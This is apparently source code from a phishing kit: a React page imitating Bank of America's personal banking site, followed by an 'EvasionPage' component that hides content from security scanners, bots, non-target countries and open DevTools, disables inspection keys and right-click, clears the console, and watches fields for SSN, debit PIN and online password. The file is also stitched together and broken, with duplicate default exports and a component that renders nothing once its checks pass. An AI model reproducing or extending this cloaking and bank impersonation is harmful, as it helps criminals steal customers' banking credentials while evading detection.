import PublicLayout from "@/components/PublicLayout";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";
import { CreditCard, Send, Smartphone, TrendingUp, Lock, DollarSign } from "lucide-react";

const Personal = () => {
  return (
    <PublicLayout showLogin={true}>
      {/* Hero Section - Personal Banking */}
      <section className="bg-gradient-to-r from-[#012169] to-[#003DA5] text-white py-16 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
            <div>
              <h1 className="text-4xl lg:text-5xl font-bold mb-4">Banking made personal</h1>
              <p className="text-lg mb-8 text-blue-100">
                At Bank of America, we're committed to helping make financial lives better through the power of every connection.
              </p>
              <Link to="/login">
                <Button className="bg-[#E31837] hover:bg-red-700 text-white font-semibold px-8 py-6 text-lg">
                  Get Started
                </Button>
              </Link>
            </div>
            <div className="rounded-lg overflow-hidden shadow-lg">
              <img src="/personal.png" alt="Banking Experience" className="w-full h-full object-cover" />
            </div>
          </div>
        </div>
      </section>

      {/* Products Section */}
      <section className="py-16 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-3xl font-bold text-gray-900 mb-2">Banking Solutions</h2>
          <p className="text-gray-600 mb-12">Everything you need for your financial journey</p>
          
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6">
            {[
              {
                icon: CreditCard,
                title: "Checking & Savings",
                description: "Flexible accounts that work for you",
                link: "/banking"
              },
              {
                icon: CreditCard,
                title: "Credit Cards",
                description: "Earn rewards on your everyday spending",
                link: "/credit-cards-public"
              },
              {
                icon: DollarSign,
                title: "Loans",
                description: "Auto loans, home loans, and more",
                link: "/loans"
              },
              {
                icon: TrendingUp,
                title: "Investments",
                description: "Grow your wealth with expert guidance",
                link: "/investments-public"
              },
              {
                icon: Send,
                title: "Money Transfers",
                description: "Send money fast and securely",
                link: "/transfers"
              },
              {
                icon: Lock,
                title: "Security",
                description: "Your accounts protected 24/7",
                link: "/help"
              }
            ].map((product) => (
              <Link key={product.title} to={product.link} className="block h-full">
                <div className="border border-gray-200 rounded-lg p-6 h-full hover:shadow-lg transition-shadow">
                  <div className="h-12 w-12 rounded-lg bg-[#E31837] flex items-center justify-center mb-4">
                    <product.icon className="h-6 w-6 text-white" />
                  </div>
                  <h3 className="text-lg font-semibold text-gray-900 mb-2">{product.title}</h3>
                  <p className="text-gray-600">{product.description}</p>
                </div>
              </Link>
            ))}
          </div>
        </div>
      </section>

      {/* Learning Section */}
      <section className="bg-gray-50 py-16 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-3xl font-bold text-gray-900 mb-2">Learn & Grow</h2>
          <p className="text-gray-600 mb-12">Financial education to help you succeed</p>
          
          <div className="grid sm:grid-cols-2 gap-6">
            <div className="bg-white rounded-lg p-8 border border-gray-200">
              <h3 className="text-xl font-semibold text-gray-900 mb-3">Financial Education</h3>
              <p className="text-gray-600 mb-4">Learn about investing, budgeting, and making smart financial decisions.</p>
              <Link to="/learning" className="text-[#012169] font-medium hover:underline">
                Explore Learning Center →
              </Link>
            </div>
            
            <div className="bg-white rounded-lg p-8 border border-gray-200">
              <h3 className="text-xl font-semibold text-gray-900 mb-3">Manage Your Account</h3>
              <p className="text-gray-600 mb-4">Access tools to track spending, set goals, and stay secure.</p>
              <Link to="/login" className="text-[#012169] font-medium hover:underline">
                Go to Dashboard →
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* Mobile App Section */}
      <section className="py-16 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
            <div>
              <h2 className="text-3xl font-bold text-gray-900 mb-4">Banking On the Go</h2>
              <p className="text-gray-600 mb-6">
                Download our mobile app for convenient banking anytime, anywhere. Check balances, transfer money, pay bills, and more.
              </p>
              <div className="flex gap-4">
                <Button className="bg-gray-900 hover:bg-gray-800 text-white px-6 py-3">
                  <Smartphone className="h-5 w-5 mr-2" />
                  Download App
                </Button>
              </div>
            </div>
            <div className="rounded-lg overflow-hidden shadow-lg">
              <img src="/personal2.png" alt="Mobile Banking Experience" className="w-full h-auto object-cover" />
            </div>
          </div>
        </div>
      </section>
    </PublicLayout>
  );
};

export default Personal;
export default Learning;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

 
}